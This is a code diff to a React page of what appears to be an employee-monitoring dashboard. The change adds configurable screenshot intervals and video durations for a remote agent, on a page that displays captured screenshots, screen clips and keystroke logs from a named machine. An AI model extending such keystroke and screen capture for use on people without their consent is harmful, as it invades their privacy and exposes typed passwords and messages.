@@ -1,7 +1,7 @@
 import { useEffect, useState } from 'react';
 import { useParams, useNavigate } from 'react-router-dom';
 import { supabase } from '../lib/supabase';
-import { ArrowLeft, Video, Keyboard, Image as ImageIcon, Play, Loader2 } from 'lucide-react';
+import { ArrowLeft, Video, Keyboard, Image as ImageIcon, Play, Loader2, Settings } from 'lucide-react';
 
 export default function EmployeeDetail() {
     const { id } = useParams();
@@ -11,6 +11,10 @@ export default function EmployeeDetail() {
     const [screenshots, setScreenshots] = useState([]);
     const [videos, setVideos] = useState([]);
     const [requestingVideo, setRequestingVideo] = useState(false);
+
+    // Settings
+    const [settings, setSettings] = useState({ screenshot_interval: 300, video_duration: 10 });
+    const [savingSettings, setSavingSettings] = useState(false);
 
     useEffect(() => {
         fetchEmployee();
@@ -42,7 +46,10 @@ export default function EmployeeDetail() {
 
     const fetchEmployee = async () => {
         const { data } = await supabase.from('employees').select('*').eq('id', id).single();
-        if (data) setEmployee(data);
+        if (data) {
+            setEmployee(data);
+            if (data.settings) setSettings(data.settings);
+        }
     };
 
     const fetchInitialData = async () => {
@@ -65,6 +72,13 @@ export default function EmployeeDetail() {
         });
     };
 
+    const saveSettings = async () => {
+        setSavingSettings(true);
+        await supabase.from('employees').update({ settings }).eq('id', id);
+        setSavingSettings(false);
+        alert('Settings saved. Agent will pick them up shortly.');
+    };
+
     if (!employee) return <div className="p-8">Loading...</div>;
 
     return (
@@ -75,15 +89,49 @@ export default function EmployeeDetail() {
                 </button>
                 <div className="flex items-center gap-4">
                     <h1 className="text-2xl font-bold">{employee.hostname}</h1>
+                </div>
+            </div>
+
+            {/* Settings Panel */}
+            <div className="bg-white p-4 rounded-xl shadow border border-gray-100 flex items-center justify-between flex-wrap gap-4">
+                <div className="flex items-center gap-2 font-semibold text-gray-700">
+                    <Settings className="w-5 h-5" /> Configuration
+                </div>
+                <div className="flex items-center gap-4">
+                    <label className="flex items-center gap-2 text-sm text-gray-600">
+                        Screenshot Interval (sec):
+                        <input
+                            type="number"
+                            value={settings.screenshot_interval}
+                            onChange={e => setSettings({ ...settings, screenshot_interval: parseInt(e.target.value) })}
+                            className="border rounded p-1 w-20"
+                        />
+                    </label>
+                    <label className="flex items-center gap-2 text-sm text-gray-600">
+                        Video Duration (sec):
+                        <input
+                            type="number"
+                            value={settings.video_duration}
+                            onChange={e => setSettings({ ...settings, video_duration: parseInt(e.target.value) })}
+                            className="border rounded p-1 w-20"
+                        />
+                    </label>
                     <button
-                        onClick={requestVideoClip}
-                        disabled={requestingVideo}
-                        className={`flex items-center px-4 py-2 text-white rounded-lg transition ${requestingVideo ? 'bg-gray-400' : 'bg-red-600 hover:bg-red-700'}`}
+                        onClick={saveSettings}
+                        disabled={savingSettings}
+                        className="bg-blue-600 text-white px-3 py-1 rounded hover:bg-blue-700 text-sm disabled:opacity-50"
                     >
-                        {requestingVideo ? <Loader2 className="w-4 h-4 mr-2 animate-spin" /> : <Video className="w-4 h-4 mr-2" />}
-                        {requestingVideo ? 'Recording...' : 'Request 10s Clip'}
+                        {savingSettings ? 'Saving...' : 'Save Config'}
                     </button>
                 </div>
+                <button
+                    onClick={requestVideoClip}
+                    disabled={requestingVideo}
+                    className={`flex items-center px-4 py-2 text-white rounded-lg transition ml-auto ${requestingVideo ? 'bg-gray-400' : 'bg-red-600 hover:bg-red-700'}`}
+                >
+                    {requestingVideo ? <Loader2 className="w-4 h-4 mr-2 animate-spin" /> : <Video className="w-4 h-4 mr-2" />}
+                    {requestingVideo ? 'Recording...' : 'Request Clip'}
+                </button>
             </div>
 
             <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
@@ -100,7 +148,6 @@ export default function EmployeeDetail() {
                                 <span className="text-xs text-gray-500 block mt-1">{new Date(vid.created_at).toLocaleString()}</span>
                             </div>
                         ))}
-                        {videos.length === 0 && <p className="text-gray-400">No videos yet.</p>}
                     </div>
                 </div>
 
@@ -118,7 +165,6 @@ export default function EmployeeDetail() {
                                 <span className="text-xs text-gray-500 block mt-1">{new Date(shot.created_at).toLocaleTimeString()}</span>
                             </a>
                         ))}
-                        {screenshots.length === 0 && <p className="text-gray-400">No screenshots yet.</p>}
                     </div>
                 </div>
 
@@ -134,7 +180,6 @@ export default function EmployeeDetail() {
                                 <div className="whitespace-pre-wrap break-words">{log.content}</div>
                             </div>
                         ))}
-                        {keylogs.length === 0 && <p className="text-gray-400">No logs yet.</p>}
                     </div>
                 </div>
             </div>
